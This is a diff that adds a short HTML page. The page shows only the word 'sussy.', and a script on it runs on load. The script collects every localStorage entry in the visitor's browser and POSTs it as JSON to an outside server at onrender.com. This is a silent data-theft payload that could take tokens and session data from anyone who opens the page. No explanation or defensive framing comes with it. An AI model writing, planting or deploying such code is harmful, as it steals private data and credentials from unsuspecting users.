@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+<p>sussy.</p>
+<script>
+  const data = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    data[key] = localStorage.getItem(key);
+  }
+  fetch("https://funnybot-jmdm.onrender.com/funny", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  })
+  .then(res => res.json())
+  .then(console.log)
+  .catch(console.error);
+</script>
+</body>
+</html>
